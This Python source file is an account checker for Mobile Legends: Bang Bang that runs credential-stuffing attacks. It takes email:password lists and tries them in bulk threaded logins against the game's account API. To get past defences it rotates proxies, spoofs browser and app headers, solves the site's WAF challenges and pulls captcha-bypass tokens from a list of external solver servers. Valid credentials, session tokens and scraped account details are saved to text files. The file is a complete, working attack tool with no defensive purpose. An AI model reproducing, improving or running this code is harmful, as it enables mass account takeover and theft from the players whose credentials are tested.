"""
MLBB Account Checker - Complete Core Logic
All functions from FULL_INFO2.py and info.py
"""

import requests
import hashlib
import json
import time
import random
import os
import re
import subprocess
import threading
import socket
import struct
import zlib
from typing import List, Dict, Optional, Any, Tuple
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning

# Try to use curl_cffi for better performance
try:
    import curl_cffi.requests as requests
    from curl_cffi.requests import Session
    HAS_CURL_CFFI = True
    IMPERSONATE = "chrome"
except ImportError:
    HAS_CURL_CFFI = False
    IMPERSONATE = None
    import requests

# Try to import info.py
try:
    from info import DeviceManager, get_player_info, SdpStruct, GameConnection
    HAS_INFO = True
except ImportError:
    HAS_INFO = False
    print("[!] Warning: info.py not found. Player info will not be available.")

# Disable SSL warnings
try:
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    pass

# ============ Constants ============

URL = "https://accountmtapi.mobilelegends.com"
MTACC_URL = "https://mtacc.mobilelegends.com/"

CN31_SERVERS = [
    "https://vincesaya-cn31.up.railway.app/get-token",
    "https://vince-cn3bai-zirbir.up.railway.app/get-token",
    "https://cn31-vince-kumakain-tite.up.railway.app/get-token",
    "https://vince-bayot-cn31-token.up.railway.app/get-token",
    "https://vince-cn31-token.up.railway.app/get-token",
    "http://217.216.35.129:8082/get-token",
    "http://217.216.35.81:8080/get-token",
    "http://cn31-antrax-solver-production.up.railway.app/api/get-token",
    "https://cn31-atx-solver-production.up.railway.app/get-token"   
]

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
SOLVE_JS = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'antrax_waf.js')

# Colors for logging
class Colors:
    W = "\033[0m"
    R = "\033[1;31m"
    G = "\033[92m"
    Y = "\033[93m"
    C = "\033[96m"
    B = "\033[0;34m\033[1m"
    M = "\033[95m"
    DIM = "\033[2m"
    SL = "\033[38;5;240m"
    GR = "\033[38;5;114m"
    GD = "\033[38;5;222m"
    BLU = "\033[38;5;39m"
    MG = "\033[38;5;165m"

# Global variables
device_manager = None
NODE_CACHE = None
PROXY_FILE = "proxies.txt"
PROXY = ""

# ============ Helper Functions ============

def md5(text: str) -> str:
    """Generate MD5 hash"""
    return hashlib.md5(text.encode()).hexdigest()

def make_sign(params: Dict) -> str:
    """Generate sign for API request"""
    sorted_items = sorted(params.items())
    sign_string = "&".join(f"{k}={v}" for k, v in sorted_items)
    sign_string += "&op=new_login_pwd"
    return md5(sign_string)

def find_node() -> Optional[str]:
    """Find Node.js executable"""
    global NODE_CACHE
    if NODE_CACHE:
        return NODE_CACHE
    
    try:
        import shutil
        cands = []
        
        # Check PATH
        p = shutil.which('node')
        if p:
            cands.append(p)
        
        # Common Windows paths
        node_paths = [
            r'C:\Program Files\nodejs\node.exe',
            r'C:\Program Files (x86)\nodejs\node.exe',
            r'C:\Users\*\AppData\Roaming\nvm\node.exe',
        ]
        
        for pattern in node_paths:
            if '*' in pattern:
                import glob
                for path in glob.glob(pattern):
                    if os.path.exists(path):
                        cands.append(path)
            elif os.path.exists(pattern):
                cands.append(pattern)
        
        # Check PATH env
        for path in os.environ.get('PATH', '').split(os.pathsep):
            node_path = os.path.join(path, 'node.exe' if os.name == 'nt' else 'node')
            if os.path.exists(node_path):
                cands.append(node_path)
        
        # Test each candidate
        for cand in cands:
            try:
                result = subprocess.run([cand, '-v'], capture_output=True, timeout=10)
                if result.returncode == 0:
                    NODE_CACHE = cand
                    return cand
            except Exception:
                continue
    except Exception:
        pass
    
    return None

def is_waf_challenge(resp) -> bool:
    """Check if response contains WAF challenge"""
    try:
        text = resp.text
        
        if resp.status_code == 405:
            return False
        
        if '<textarea id="renderData"' in text:
            return True
        
        if 'acw_sc__v2' in text and '<script' in text.lower():
            return True
        
        if 'aliyun_waf_aa' in text:
            if 'acw_sc__v2' in text or '<script' in text.lower():
                return True
        
        waf_patterns = [
            'acw_sc__v2',
            'aliyunwaf',
            'waf/',
            'cdn-cgi/challenge-platform',
            'cf-challenge',
        ]
        
        for pattern in waf_patterns:
            if pattern.lower() in text.lower():
                return True
        
        return False
    except:
        return False

def solve_acw_sc_v2(html: str) -> Optional[str]:
    """Solve WAF challenge using Node.js"""
    # Fast direct extraction
    dm = re.search(r'acw_sc__v2\s*=\s*[\'"]([^\'"]+)[\'"]', html)
    if dm:
        return dm.group(1)
    
    dm2 = re.search(r'acw_sc__v2=([^;\'"\s&<]+)', html)
    if dm2:
        return dm2.group(1)
    
    # Use Node.js to solve
    node_bin = find_node()
    if not node_bin:
        return None
    
    try:
        kwargs = {}
        if os.name == 'nt':
            kwargs['creationflags'] = 0x08000000
        
        p = subprocess.run(
            [node_bin, SOLVE_JS],
            input=html.encode('utf-8'),
            capture_output=True,
            timeout=15,
            **kwargs,
        )
        out = p.stdout.decode('utf-8', errors='ignore').strip()
        if p.returncode == 0 and out and out != 'NO_COOKIE':
            return out
    except Exception:
        pass
    
    return None

def load_device_manager():
    """Load device manager for player info"""
    global device_manager
    if HAS_INFO:
        try:
            device_manager = DeviceManager("devices.txt")
            if device_manager.devices:
                print(f"{Colors.G}+{Colors.W} Devices loaded: {len(device_manager.devices)}")
            else:
                print(f"{Colors.Y}!{Colors.W} No devices found in devices.txt")
                device_manager = None
        except Exception as e:
            print(f"{Colors.R}!{Colors.W} Failed to load devices: {e}")
            device_manager = None

def extract_token_from_response(data) -> Optional[str]:
    """Extract CN31 token from response"""
    if not data:
        return None
    
    token = None
    
    if isinstance(data, dict):
        for key in ['token', 'cn31', 'e_captcha', 'captcha', 'data']:
            if key in data:
                value = data[key]
                if isinstance(value, str) and value.strip():
                    token = value.strip()
                    break
                elif isinstance(value, dict):
                    for subkey in ['token', 'cn31', 'e_captcha', 'captcha']:
                        if subkey in value and value[subkey]:
                            token = value[subkey].strip()
                            break
                    if token:
                        break
                elif isinstance(value, list) and value:
                    for item in value:
                        if isinstance(item, str) and item.strip():
                            token = item.strip()
                            break
                    if token:
                        break
    
    elif isinstance(data, list) and data:
        for item in data:
            if isinstance(item, str) and item.strip():
                token = item.strip()
                break
            elif isinstance(item, dict):
                for key in ['token', 'cn31', 'e_captcha', 'captcha']:
                    if key in item and item[key]:
                        token = item[key].strip()
                        break
                if token:
                    break
    
    if token and isinstance(token, str):
        token = token.strip()
        if not token.startswith('CN31_'):
            token = f"CN31_{token}"
        if len(token) > 20:
            return token
    
    return None

def parse_proxy(proxy_str: str) -> Optional[Dict]:
    """Parse proxy string to dict"""
    if not proxy_str:
        return None
    
    parts = proxy_str.split(":")
    if len(parts) == 4:
        host, port, username, password = parts
        proxy_url = f"http://{username}:{password}@{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    elif len(parts) == 2:
        host, port = parts
        proxy_url = f"http://{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    return None

def load_proxies_from_file(file_path: str) -> List[str]:
    """Load proxies from file"""
    proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
    except FileNotFoundError:
        pass
    return proxies

def get_proxy() -> Optional[Dict]:
    """Get random proxy from file"""
    if PROXY_FILE:
        proxies = load_proxies_from_file(PROXY_FILE)
        if proxies:
            return parse_proxy(random.choice(proxies))
    if PROXY:
        return parse_proxy(PROXY)
    return None

def get_player_info_api(guid: str, session_token: str) -> Optional[Dict]:
    """Get player info using info.py"""
    global device_manager
    if not HAS_INFO or not device_manager:
        return None
    
    try:
        player_data = get_player_info(
            guid=int(guid),
            session=session_token,
            device_manager=device_manager
        )
        return player_data
    except Exception as e:
        print(f"Error getting player info: {e}")
        return None

def save_detailed_account_api(account_data: Dict, player_info: Dict = None):
    """Save detailed account info to file"""
    try:
        with open("valid_detailed.txt", "a", encoding="utf-8") as f:
            f.write(f"{'=' * 70}\n")
            f.write(f"LOGIN: {account_data['email']}:{account_data['password']}\n")
            f.write(f"GUID: {account_data.get('guid', 'N/A')}\n")
            if 'session' in account_data and account_data['session']:
                f.write(f"Session: {account_data['session']}\n")
            
            if player_info:
                d = player_info.get("data", {})
                basic = d.get("basic_info", {})
                game = d.get("game_info", {})
                loc = d.get("location_info", {})
                collector = d.get("collector_info", {})
                skin = d.get("skin_info", {})
                sec = d.get("security_info", {})
                extra = d.get("extra_info", {})
                
                f.write(f"  Nickname: {basic.get('nickname')}\n")
                f.write(f"  Player ID: {basic.get('player_id')}\n")
                f.write(f"  Server: {basic.get('server')}\n")
                f.write(f"  Level: {basic.get('level')}\n")
                f.write(f"  Skin Count: {basic.get('skin_count')}\n")
                f.write(f"  Hero Count: {basic.get('hero_count')}\n")
                
                if skin.get("skin_breakdown"):
                    for stype, cnt in skin["skin_breakdown"].items():
                        if stype != "Total Skins":
                            f.write(f"  {stype:<22}: {cnt}\n")
                    if "Total Skins" in skin["skin_breakdown"]:
                        f.write(f"  {'Total Skins':<22}: {skin['skin_breakdown']['Total Skins']}\n")
                
                f.write(f"  Current Rank: {game.get('current_rank')}\n")
                f.write(f"  Highest Rank: {game.get('high_rank')}\n")
                f.write(f"  Achievement Points: {game.get('achievement_points')}\n")
                f.write(f"  Total Matches: {game.get('matches')}\n")
                f.write(f"  Squad: {game.get('squad')}\n")
                
                heroes = game.get('hero_history', ['N/A'])
                f.write(f"\nHero History: \n")
                for i, hero in enumerate(heroes, 1):
                    f.write(f"  {i:>2}. {hero}\n")
                
                f.write(f"  Collector Points: {collector.get('collector_point')}\n")
                f.write(f"  Collector Tier: {collector.get('collector_tier')}\n")
                f.write(f"  Location: {loc.get('location')}\n")
                f.write(f"  Last Login: {loc.get('last_login')}\n")
                f.write(f"  Last Login Country: {loc.get('last_login_country')}\n")
                f.write(f"  Account Country: {loc.get('create_account_country')}\n")
                f.write(f"  V2L Status: {sec.get('v2l_status', 'No')}\n")
                f.write(f"  Ban Status: {sec.get('ban_status', 'False')}\n")
                if sec.get('ban_reason') and sec.get('ban_reason') != 'N/A':
                    f.write(f"  Ban Reason: {sec.get('ban_reason')}\n")
                f.write(f"  Bindings: {sec.get('bindings', 'N/A')}\n")
                
                # Extra info
                extra_fields = [
                    ('Rating Score', 'rating_score'),
                    ('Followers', 'followers'),
                    ('Popularity', 'popularity'),
                    ('Likes', 'likes'),
                    ('Credits Score', 'credits_score'),
                    ('Starlight User', 'starlight_user'),
                    ('Starlight Count', 'starlight_count'),
                    ('Creation Date', 'creation_date'),
                    ('Battle Points (BP)', 'battle_points'),
                    ('Diamonds', 'diamonds'),
                    ('Win Rate', 'win_rate'),
                ]
                for label, key in extra_fields:
                    val = extra.get(key)
                    if val and val != "N/A" and val != "None" and val != 0:
                        f.write(f"  {label:<22}: {val}\n")
            
            f.write(f"\n{'=' * 70}\n\n")
    except Exception as e:
        print(f"Error saving detailed account: {e}")

# ============ Cookie Manager ============

class CookieManager:
    def __init__(self):
        self.cookies = {}
        self.last_refresh = 0
        self.session = self._create_session()
        self.cookie_file = "cookies.json"
        self.load_cookies()
    
    def _create_session(self):
        if HAS_CURL_CFFI:
            return Session(impersonate=IMPERSONATE)
        return requests.Session()
    
    def load_cookies(self):
        try:
            with open(self.cookie_file, 'r') as f:
                self.cookies = json.load(f)
        except FileNotFoundError:
            self.cookies = {}
        except Exception:
            self.cookies = {}
    
    def save_cookies(self):
        try:
            with open(self.cookie_file, 'w') as f:
                json.dump(self.cookies, f)
        except Exception:
            pass
    
    def fetch_fresh_cookies(self, proxy=None):
        try:
            self.session = self._create_session()
            self.session.headers.update({
                "User-Agent": USER_AGENT,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
            })
            
            if proxy:
                self.session.proxies.update(proxy)
            
            resp = self.session.get(MTACC_URL, timeout=10, verify=False)
            
            if resp.status_code == 200:
                cookies = self.session.cookies.get_dict()
                
                if 'ssxmod_itna' in cookies or 'ssxmod_itna2' in cookies:
                    self.cookies = cookies
                    self.last_refresh = time.time()
                    self.save_cookies()
                    return True
                
                html = resp.text
                
                if is_waf_challenge(resp):
                    acw = solve_acw_sc_v2(html)
                    if acw:
                        self.cookies['acw_sc__v2'] = acw
                        sc = resp.headers.get('Set-Cookie', '')
                        tc_match = re.search(r'acw_tc=([^;]+)', sc)
                        if tc_match:
                            self.cookies['acw_tc'] = tc_match.group(1)
                        self.last_refresh = time.time()
                        self.save_cookies()
                        return True
                
                script_cookies = self.extract_cookies_from_html(html)
                if script_cookies:
                    self.cookies.update(script_cookies)
                    self.last_refresh = time.time()
                    self.save_cookies()
                    return True
        
        except Exception:
            pass
        
        return False
    
    def extract_cookies_from_html(self, html):
        cookies = {}
        
        cookie_patterns = [
            r'document\.cookie\s*=\s*["\']([^"\']+)["\']',
            r'ssxmod_itna[^;]*=[^;]+',
            r'ssxmod_itna2[^;]*=[^;]+',
        ]
        
        for pattern in cookie_patterns:
            matches = re.findall(pattern, html)
            for match in matches:
                if '=' in match:
                    parts = match.split('=', 1)
                    if len(parts) == 2:
                        key = parts[0].strip()
                        value = parts[1].strip().rstrip(';')
                        if key and value:
                            cookies[key] = value
        
        meta_cookies = re.findall(r'<meta[^>]+http-equiv=["\']set-cookie["\'][^>]+content=["\']([^"\']+)["\']', html, re.IGNORECASE)
        for cookie_str in meta_cookies:
            if '=' in cookie_str:
                parts = cookie_str.split('=', 1)
                if len(parts) == 2:
                    key = parts[0].strip()
                    value = parts[1].strip().split(';')[0]
                    if key and value:
                        cookies[key] = value
        
        return cookies
    
    def get_cookies(self, proxy=None):
        current_time = time.time()
        
        if self.cookies and (current_time - self.last_refresh) < 300:
            return self.cookies
        
        if self.fetch_fresh_cookies(proxy):
            return self.cookies
        
        return self.cookies if self.cookies else {}
    
    def force_refresh(self, proxy=None):
        self.fetch_fresh_cookies(proxy)
        return self.cookies
    
    def handle_waf_challenge(self, resp, header_cookies=None):
        acw = solve_acw_sc_v2(resp.text)
        if not acw:
            return False
        
        sc = resp.headers.get('Set-Cookie', '')
        tc_match = re.search(r'acw_tc=([^;]+)', sc)
        if tc_match:
            self.cookies['acw_tc'] = tc_match.group(1)
        
        if header_cookies:
            for k, v in header_cookies.items():
                self.cookies.setdefault(k, v)
        
        self.cookies['acw_sc__v2'] = acw
        self.last_refresh = time.time()
        self.save_cookies()
        return True

cookie_manager = CookieManager()

# ============ CN31 Manager ============

class CN31Manager:
    def __init__(self, servers=None):
        self.servers = servers or CN31_SERVERS.copy()
        self.current_server_index = 0
        self.server_stats = {server: {'success': 0, 'fail': 0, 'last_use': 0} for server in self.servers}
        self.lock = threading.Lock()
        self.failed_servers = set()
        self.fail_cooldown = {}
        self.total_requests = 0
        self.successful_requests = 0
        
    def get_next_server(self):
        with self.lock:
            now = time.time()
            expired = [s for s, t in self.fail_cooldown.items() if now - t > 30]
            for s in expired:
                self.fail_cooldown.pop(s, None)
                self.failed_servers.discard(s)
            
            available = [s for s in self.servers if s not in self.failed_servers]
            
            if not available:
                self.failed_servers.clear()
                self.fail_cooldown.clear()
                available = self.servers
            
            start_index = self.current_server_index
            for i in range(len(available)):
                idx = (start_index + i) % len(available)
                server = available[idx]
                self.current_server_index = (idx + 1) % len(available)
                
                if server in self.fail_cooldown:
                    if now - self.fail_cooldown[server] < 30:
                        continue
                    else:
                        self.fail_cooldown.pop(server, None)
                        self.failed_servers.discard(server)
                
                return server
            
            return available[0] if available else self.servers[0]
    
    def report_success(self, server):
        with self.lock:
            if server in self.server_stats:
                self.server_stats[server]['success'] += 1
                self.server_stats[server]['last_use'] = time.time()
                self.failed_servers.discard(server)
                self.fail_cooldown.pop(server, None)
                self.total_requests += 1
                self.successful_requests += 1
    
    def report_failure(self, server):
        with self.lock:
            if server in self.server_stats:
                self.server_stats[server]['fail'] += 1
                self.server_stats[server]['last_use'] = time.time()
                self.total_requests += 1
                
                if self.server_stats[server]['fail'] > 2:
                    self.failed_servers.add(server)
                    self.fail_cooldown[server] = time.time()
    
    def get_stats(self):
        with self.lock:
            stats = {}
            for server in self.servers:
                s = self.server_stats.get(server, {'success': 0, 'fail': 0, 'last_use': 0})
                stats[server] = {
                    'success': s['success'],
                    'fail': s['fail'],
                    'status': 'ONLINE' if server not in self.failed_servers else 'COOLDOWN',
                    'last_use': s['last_use']
                }
            return stats

def fetch_cn31_token_multiple(server_list=None):
    cn31_manager = CN31Manager(server_list or CN31_SERVERS)
    
    max_attempts = len(cn31_manager.servers) * 2
    attempts = 0
    
    while attempts < max_attempts:
        attempts += 1
        server = cn31_manager.get_next_server()
        
        try:
            response = requests.get(server, timeout=8)
            if response.status_code == 200:
                data = response.json()
                
                token = extract_token_from_response(data)
                if token:
                    cn31_manager.report_success(server)
                    return token, server
            
            cn31_manager.report_failure(server)
            
        except Exception:
            cn31_manager.report_failure(server)
            continue
    
    return None, None

def fetch_cn31_token():
    token, server = fetch_cn31_token_multiple()
    return token

def fetch_cn31_token_with_server():
    token, server = fetch_cn31_token_multiple()
    return token, server

# ============ Account Checking ============

def check_account_with_retry(session, user: str, pw: str, ecap: str, max_retries: int = 3, proxy=None, callback=None):
    """Check a single account with retry"""
    retry_count = 0
    max_attempts = 5
    
    while retry_count < max_attempts:
        try:
            p = md5(pw)
            params = {
                "account": user,
                "md5pwd": p,
                "game_token": "",
                "recaptcha_token": "",
                "e_captcha": ecap,
                "country": ""
            }
            
            sign = make_sign(params)
            
            payload = {
                "op": "new_login_pwd",
                "sign": sign,
                "params": params,
                "lang": "en"
            }
            
            if proxy:
                session.proxies.update(proxy)
            
            r = session.post(URL, json=payload, timeout=15)
            
            if is_waf_challenge(r):
                if cookie_manager.handle_waf_challenge(r):
                    cookies = cookie_manager.get_cookies()
                    if cookies:
                        session.cookies.update(cookies)
                    retry_count += 1
                    continue
                else:
                    retry_count += 1
                    if retry_count < max_attempts:
                        time.sleep(1)
                        continue
                    return None, "WAF_UNRESOLVED", retry_count
            
            if r.status_code == 405:
                cookie_manager.force_refresh(proxy)
                retry_count += 1
                if retry_count < max_attempts:
                    time.sleep(1)
                    continue
                return None, "IP_BLOCKED_405", retry_count
            
            if not r.text or r.text.strip() == '':
                retry_count += 1
                new_ecap, server = fetch_cn31_token_with_server()
                if new_ecap:
                    ecap = new_ecap
                time.sleep(0.5)
                continue
            
            try:
                js = r.json()
            except (ValueError, json.JSONDecodeError):
                retry_count += 1
                new_ecap, server = fetch_cn31_token_with_server()
                if new_ecap:
                    ecap = new_ecap
                time.sleep(0.5)
                continue
            
            code = js.get("code")
            message = js.get("message", "Unknown error")
            
            error_str = str(message)
            
            if "Error_PasswdError" in error_str:
                return js, "Error_PasswdError", retry_count
            elif "Error_NeedEmailCode_Login" in error_str:
                return js, "Error_NeedEmailCode_Login", retry_count
            elif "Error_UserNotExist" in error_str:
                return js, "Error_UserNotExist", retry_count
            elif code == 0:
                return js, "Valid", retry_count
            elif "Error_ECaptcha_VerifyFail" in error_str:
                if retry_count < max_attempts - 1:
                    new_ecap, server = fetch_cn31_token_with_server()
                    if new_ecap:
                        ecap = new_ecap
                    retry_count += 1
                    continue
                else:
                    return js, "Captcha_Failed", retry_count
            elif "Error_FailedTooMuch" in error_str or "FailedTooMuch" in error_str:
                if retry_count < max_attempts - 1:
                    new_ecap, server = fetch_cn31_token_with_server()
                    if new_ecap:
                        ecap = new_ecap
                    retry_count += 1
                    time.sleep(1)
                    continue
                else:
                    return js, "FailedTooMuch", retry_count
            
            if retry_count < max_attempts - 1:
                retry_count += 1
                new_ecap, server = fetch_cn31_token_with_server()
                if new_ecap:
                    ecap = new_ecap
                time.sleep(0.5)
                continue
            else:
                return js, message, retry_count
            
        except requests.exceptions.RequestException as e:
            retry_count += 1
            if retry_count < max_attempts:
                new_ecap, server = fetch_cn31_token_with_server()
                if new_ecap:
                    ecap = new_ecap
                time.sleep(0.5)
                continue
            else:
                return None, f"Request Error: {str(e)[:30]}", retry_count
        except Exception as e:
            retry_count += 1
            if retry_count < max_attempts:
                new_ecap, server = fetch_cn31_token_with_server()
                if new_ecap:
                    ecap = new_ecap
                time.sleep(0.5)
                continue
            else:
                return None, f"Error: {str(e)[:30]}", retry_count
    
    return None, "Max retries exceeded", retry_count

def process_single_account(account: str, task_id: str = None, callback=None, detailed: bool = False) -> Dict:
    """Process a single account"""
    result = {
        "account": account,
        "success": False,
        "error": None,
        "account_data": None,
        "player_data": None
    }
    
    if ":" not in account:
        result["error"] = "Invalid format"
        if callback:
            callback(result)
        return result
    
    user, pw = account.split(":", 1)
    
    # Get token
    ecap, server = fetch_cn31_token_with_server()
    if not ecap:
        result["error"] = "No CN31 token available"
        if callback:
            callback(result)
        return result
    
    # Create session
    if HAS_CURL_CFFI:
        session = Session(impersonate=IMPERSONATE)
    else:
        session = requests.Session()
    
    session.headers.update({
        "Host": "accountmtapi.mobilelegends.com",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": '"Android"',
        "User-Agent": "Mozilla/5.0 (Linux; Android 16; CPH2603 Build/BP2A.250605.015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/151.0.7922.169 Mobile Safari/537.36;UniWebView;mtakit",
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": '"Not=A?Brand";v="99", "Android WebView";v="151", "Chromium";v="151"',
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "Origin": "https://mtacc.mobilelegends.com",
        "X-Requested-With": "com.mobile.legends",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://mtacc.mobilelegends.com/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-PH,en-US;q=0.9,en;q=0.8"
    })
    
    proxy = get_proxy()
    cookies = cookie_manager.get_cookies(proxy)
    if cookies:
        session.cookies.update(cookies)
    
    # Check account
    js, message, retry_count = check_account_with_retry(
        session, user, pw, ecap, max_retries=3, proxy=proxy, callback=callback
    )
    
    if js and js.get("code") == 0:
        data = js.get("data", {})
        guid = data.get("guid", "")
        session_token = data.get("session", "")
        
        account_data = {
            "email": user,
            "password": pw,
            "guid": guid,
            "session": session_token
        }
        
        result["success"] = True
        result["account_data"] = account_data
        
        # Get player info if detailed
        if detailed and guid and session_token:
            player_info = get_player_info_api(guid, session_token)
            if player_info:
                result["player_data"] = player_info
                # Save detailed info
                save_detailed_account_api(account_data, player_info)
        
        # Save to valid.txt
        try:
            with open("valid.txt", "a", encoding="utf-8") as f:
                f.write(f"{'=' * 65}\n")
                f.write(f"Credential: {user}:{pw}\n")
                f.write(f"GUID: {guid}\n")
                if session_token:
                    f.write(f"Session: {session_token}\n")
                f.write(f"{'=' * 65}\n\n")
        except Exception:
            pass
        
        # Save session
        if session_token:
            try:
                with open("session.txt", "a", encoding="utf-8") as f:
                    f.write(f"{'=' * 65}\n")
                    f.write(f"Credential: {user}:{pw}\n")
                    f.write(f"GUID: {guid}\n")
                    f.write(f"Session: {session_token}\n")
                    f.write(f"{'=' * 65}\n\n")
            except Exception:
                pass
    else:
        result["error"] = message[:50] if message else "Unknown error"
    
    if callback:
        callback(result)
    
    return result

def check_accounts_bulk(accounts: List[str], threads: int = 10, callback=None, detailed: bool = False, task_id: str = None) -> Dict:
    """Bulk check accounts with threading"""
    results = []
    total = len(accounts)
    valid_count = 0
    invalid_count = 0
    
    def process_wrapper(account):
        nonlocal valid_count, invalid_count
        try:
            result = process_single_account(account, task_id, None, detailed)
            
            if result["success"]:
                valid_count += 1
            else:
                invalid_count += 1
            
            if callback:
                callback({
                    "account": account,
                    "success": result["success"],
                    "error": result.get("error"),
                    "account_data": result.get("account_data"),
                    "player_data": result.get("player_data")
                })
            
            return result
        except Exception as e:
            if callback:
                callback({
                    "account": account,
                    "success": False,
                    "error": str(e)[:50]
                })
            return {"account": account, "success": False, "error": str(e)}
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(process_wrapper, acc): acc for acc in accounts}
        for future in as_completed(futures):
            try:
                result = future.result()
                results.append(result)
            except Exception:
                pass
    
    return {
        "success": True,
        "total": total,
        "valid": valid_count,
        "invalid": invalid_count,
        "results": results
    }